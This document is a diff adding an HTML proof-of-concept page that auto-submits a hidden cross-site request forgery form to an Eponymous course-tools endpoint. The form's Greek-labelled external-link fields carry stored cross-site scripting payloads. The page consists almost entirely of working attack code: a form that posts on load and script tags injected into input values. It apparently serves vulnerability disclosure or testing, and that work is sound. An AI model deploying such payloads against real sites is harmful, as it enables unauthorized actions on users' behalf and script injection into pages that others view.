@@ -1,0 +1,33 @@
+<form id='csrf_form' action='http://Eponymous.csec.gr/modules/course_tools/course_tools.php?submit=yes&action=2' method='post'>
+<br>
+  <table width="99%" align='left' class='FormData'>
+  <tbody>
+  <tr>
+  <th class='left' width='220'>&nbsp;</th>
+  <td><b>Στοιχεία εξωτερικού συνδέσμου</b></td>
+  <td>&nbsp;</td>
+  </tr>
+  <tr>
+  <th class='left'>Σύνδεσμος&nbsp;:</th>
+  <td><input type="text" name="link" size="50" value="http://<script>alert('link')</script>" class='FormData_InputText'></td>
+  <td>&nbsp;</td>
+  </tr>
+  <tr>
+  <th class='left'>Όνομα&nbsp;:</th>
+  <td><input type="Text" name="name_link" size="50" value="http://<script>alert('namelink')</script>" class='FormData_InputText'></td>
+  <td>&nbsp;</td>
+  </tr>
+  <tr>
+  <th class='left'>&nbsp;</th>
+  <td>&nbsp;</td>
+  </tr>
+  </thead>
+  </table>
+
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
